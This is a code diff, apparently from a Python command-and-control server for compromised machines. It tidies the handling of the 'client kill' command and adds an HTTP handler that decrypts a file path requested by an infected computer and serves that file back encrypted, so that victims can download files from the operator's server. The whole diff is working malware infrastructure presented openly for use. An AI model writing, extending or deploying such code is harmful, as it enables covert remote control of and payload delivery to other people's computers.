@@ -9,8 +9,8 @@ from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from encryption import cipher
 # Settings Variables(Constants) Importing
-from settings import (CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
-                      RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT)
+from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
+                      BIND_ADDR, PORT)
 
 
 def get_new_session():
@@ -134,16 +134,37 @@ class C2Handler(BaseHTTPRequestHandler):
                 except Exception as e:
                     print(Fore.LIGHTRED_EX+"[!] Unknown Error when Sending Command to C2 Client\n"+Fore.RESET)
                     print(f'Error Content:\n{e}')
-
-                # If we have just killed a client, try to get a new session to set it active
-                if command.startswith("client kill"):
-                    get_new_session()
+                # else block for fixing client kill command for the down client
+                else:
+                    # If we have just killed a client, try to get a new session to set it active
+                    if command.startswith("client kill"):
+                        get_new_session()
             
             # if client in the pwnedDict but is Not Active Session
             else:
                 # Send HTTP Response Code and Header back to the client
                 self.http_response(404)
-                
+
+
+        # Follow this code block when a compromised computer is request a file
+        elif self.path.startswith(FILE_REQUEST):
+            # Split out the encrypted filepath from HTTP GET Request
+            filepath = self.path.split(FILE_REQUEST)[1]
+
+            # Encode the file path because decrypt requires it, then decrypt and then decode it
+            filepath = cipher.decrypt(filepath.encode()).decode()
+
+            # Read the requested file into memory and stream it back for the client's GET Response
+            try:
+                with open(f"{filepath}", "rb") as fileHandle:
+                    self.http_response(200)
+                    self.wfile.write(cipher.encrypt(fileHandle.read()))
+
+            except (FileNotFoundError, OSError):
+                print(f"{filepath} was not found on C2 Server.")
+                self.http_response(404)
+
+
     def do_POST(self):
         """this method handles all http POST Requests arrived at the C2 server."""
         
